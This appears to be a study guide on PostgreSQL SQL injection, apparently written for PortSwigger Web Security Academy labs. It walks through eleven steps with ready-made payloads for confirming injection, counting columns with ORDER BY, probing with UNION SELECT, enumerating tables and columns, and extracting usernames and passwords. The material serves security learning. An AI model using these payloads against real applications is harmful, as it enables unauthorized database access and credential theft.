# PostgreSQL Database

## Introduction

PostgreSQL is a powerful open-source Relational Database Management System (RDBMS).

It is widely used in web applications because of its performance, reliability, and advanced SQL features.

Many real-world applications and PortSwigger Web Security Academy labs use PostgreSQL as the backend database.

Unlike Oracle, PostgreSQL has its own SQL syntax, system tables, and built-in functions. Therefore, SQL Injection payloads used for PostgreSQL are different from those used for Oracle, MySQL, SQL Server, or SQLite.

---

# PostgreSQL SQL Injection Methodology

When testing a PostgreSQL-based application, follow this process.

```
Identify Injection Point
        │
        ▼
Confirm SQL Injection
        │
        ▼
Determine Number of Columns
        │
        ▼
Find Text Column
        │
        ▼
Confirm PostgreSQL Database
        │
        ▼
Retrieve Database Version
        │
        ▼
Retrieve Current User
        │
        ▼
Retrieve Current Database
        │
        ▼
Enumerate Tables
        │
        ▼
Enumerate Columns
        │
        ▼
Extract Data
```

---

# Step 1 - Identify the Injection Point

Find user-controlled input such as:

- URL Parameters
- Search Box
- Login Form
- POST Parameters
- Cookies

Example:

```
https://example.com/filter?category=Accessories
```

Injection Point:

```
category
```

---

# Step 2 - Confirm SQL Injection

Test with:

```sql
'
```

If the application returns an SQL error, the parameter may be vulnerable.

Next test:

```sql
'--
```

If the page loads normally, SQL comments are working.

Next test:

```sql
' OR 1=1--
```

If more data is displayed, SQL Injection is confirmed.

---

# Step 3 - Determine the Number of Columns

Use the `ORDER BY` technique.

```sql
' ORDER BY 1--
```

```sql
' ORDER BY 2--
```

```sql
' ORDER BY 3--
```

Increase the number until an error occurs.

The previous successful number is the total number of columns.

---

# Step 4 - Find the Text Column

Use `UNION SELECT`.

Example:

```sql
' UNION SELECT NULL,NULL--
```

Replace each `NULL` with text.

Example:

```sql
' UNION SELECT 'TEST',NULL--
```

or

```sql
' UNION SELECT NULL,'TEST'--
```

The column displaying **TEST** is the text column.

---

# Step 5 - Confirm PostgreSQL Database

Retrieve the PostgreSQL version.

```sql
' UNION SELECT NULL,version()--
```

If the application displays a PostgreSQL version string, the backend database is PostgreSQL.

---

# Step 6 - Retrieve Database Version

```sql
' UNION SELECT NULL,version()--
```

Example Output

```
PostgreSQL 15.3 on x86_64-pc-linux-gnu
```

---

# Step 7 - Retrieve Current User

```sql
' UNION SELECT NULL,current_user--
```

---

# Step 8 - Retrieve Current Database

```sql
' UNION SELECT NULL,current_database()--
```

---

# Step 9 - Enumerate Tables

PostgreSQL stores table information inside:

```
information_schema.tables
```

Example:

```sql
' UNION SELECT NULL,table_name
FROM information_schema.tables--
```

---

# Step 10 - Enumerate Columns

PostgreSQL stores column information inside:

```
information_schema.columns
```

Example:

```sql
' UNION SELECT NULL,column_name
FROM information_schema.columns
WHERE table_name='users'--
```

---

# Step 11 - Extract Data

After identifying the required table and columns:

Example:

```sql
' UNION SELECT username,password
FROM users--
```

---

# PostgreSQL System Tables

| Table | Purpose |
|-------|---------|
| information_schema.tables | List all tables |
| information_schema.columns | List all columns |
| pg_catalog.pg_tables | PostgreSQL table information |
| pg_catalog.pg_user | PostgreSQL user information |

---

# Summary

1. Identify the injection point.
2. Confirm SQL Injection.
3. Find the number of columns.
4. Find the text column.
5. Confirm PostgreSQL database.
6. Retrieve database version.
7. Retrieve current user.
8. Retrieve current database.
9. Enumerate tables.
10. Enumerate columns.
11. Extract data.
